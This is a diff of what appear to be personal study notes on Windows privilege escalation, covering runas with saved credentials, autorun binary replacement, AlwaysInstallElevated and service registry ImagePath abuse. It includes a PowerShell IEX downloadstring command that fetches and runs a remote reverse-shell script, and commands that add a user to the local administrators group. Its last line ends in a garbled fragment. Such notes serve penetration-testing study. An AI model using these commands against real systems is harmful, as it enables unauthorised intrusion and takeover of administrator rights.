@@ -234,15 +234,6 @@ This command allows us to run commands as somebody else.
 We can use this command only if we have stored keys on cmdkey /list command.
 example runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object net.webclient).downloadstring('http://IP/FILENAME.ps1')" (the file will have a reverse shell/ other things that we want to abuse).
 ```
-# Autorun
-```
-Autorun is when we have a program that is set to autorun (we dont need any interaction to make it run e.x someone loging on will make the autorun program.exe to run).
-We can use a tool named ---> Autroruns64.exe to see what is autorunning.
-We can use a tool named accesschk64.exe with the flags -#w#(only show files with write)#v#(verbose)#u#(ignore errors) and the path to the file that we want to check the access (e.x Accesschk64.exe -wvu "c:\program files\autorun program".
-After we will run the tool we will look for an option named RW everyone and FILE_ALL_ACCESS that means that we can make someone else to run this file and get a revshell on the user that has run this program.exe.
-Lets say the we can RW on the path that the program.exe is on, we can create a malicious file that has a reverse shell to our session, and replace it with the existing file that is on there.
-We will make our own file and open a listener on nc/ meterpreter and we will wait until it will trigger the file.
-```
 # PowerUp
 ```
 PowerUp is the result of wanting a clean way to audit client systems for common Windows privilege escalation vectors. It utilizes varios service abuse checks, .dll hijacking opportunities, registry checks, and more to enumerate common ways that you might be able to elevate on a target system.
@@ -252,7 +243,16 @@ So we will do the command ---> Write-UserAddMSI (in the powerup path).
 It will install a melicious msi file that we could elevate to higher privileged.
 We will run the program that we've created that has admin priv and get a user added to administrator localgroup (in our case).
 ```
-# AlwaysInstallElevated
+# Registry Escalation with Autorun
+```
+Autorun is when we have a program that is set to autorun (we dont need any interaction to make it run e.x someone loging on will make the autorun program.exe to run).
+We can use a tool named ---> Autroruns64.exe to see what is autorunning.
+We can use a tool named accesschk64.exe with the flags -#w#(only show files with write)#v#(verbose)#u#(ignore errors) and the path to the file that we want to check the access (e.x Accesschk64.exe -wvu "c:\program files\autorun program".
+After we will run the tool we will look for an option named RW everyone and FILE_ALL_ACCESS that means that we can make someone else to run this file and get a revshell on the user that has run this program.exe.
+Lets say the we can RW on the path that the program.exe is on, we can create a malicious file that has a reverse shell to our session, and replace it with the existing file that is on there.
+We will make our own file and open a listener on nc/ meterpreter and we will wait until it will trigger the file.
+```
+# Registry Escalaation with AlwaysInstallElevated
 ```
 We can use the AlwaysInstallElevated policy to install a Windows Installer package with elevated (system) privileges.
 This option is equivalent to granting full administrative rights, which can pose a massive security risk. Microsoft strongly discourages the use of this setting.
@@ -260,7 +260,20 @@ To see if we have premission to do so we can use the command ---> reg query HKLM
 We also need to run ---> reg query HKCU\Software\Policies\Microsoft\Windows\Installer we need to have 0x1 on that too for us to have premission to install windows packages with elevated privileges.
 WE NEED BOTH TO HAVE 0x1 for that to work.
 ```
+# Service Escalation Registry
+```
+First we will need to detect the escalation path.
+Lets write the command on PowerShell(must) ---> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+If we see that the user belongs to "NT AUTHORITY\INTERACTIVE" has "FullControl" premission over the registry key, then we can escalate.
+So lets copy a file named windows_service.c (tool that we need to download).
+After we got the tool on our machine we can replace the command used by the system() function to the command ---> cmd.exe /k net localgroup administrators user /add.
+After we got it we need to complie the file by typing the following command ---> x86_64-w64-mingw32-gcc windows_service.c -o x.exe.
+And then we need to copy the file to our vulnerable machine.
+We will place the file to the c:\TEMP folder and will write the next command ---> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f (flags: /v (we will tell what registry we want to add the file to) (ImagePath is an image key that contains the path of the driver image file and when we will run the command sc start regsvc we will execute the x.exe file that we've created and added to the registry). /t (type) /d (data, path to the file that we want to execute). /f (dont tell me anything that is going on).
+Then lets run the command sc start regsvc.
+After we will run the command we will se the the user that we wanted to add is in the administrators group ---> net localgroup adminstrators.
+``` 
 # rdesktop connection 
 ```
-rdesktop $IP -g 95% 
+rdesktop $IP -g 95% ais an image eky
 ```
